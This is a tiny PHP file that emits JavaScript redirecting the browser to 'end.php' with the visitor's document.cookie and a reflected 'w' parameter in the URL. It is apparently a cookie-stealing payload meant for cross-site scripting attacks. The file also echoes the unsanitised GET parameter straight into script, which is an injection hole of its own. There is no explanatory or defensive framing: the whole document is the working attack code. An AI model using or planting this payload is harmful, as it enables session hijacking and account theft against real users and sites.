<script type="text/javascript">
<?php
$whr=$_GET["w"];
if(!isset($whr)){
	$whr=0;}
echo "document.location='end.php?w=$whr&c='+document.cookie;";
?>

</script>


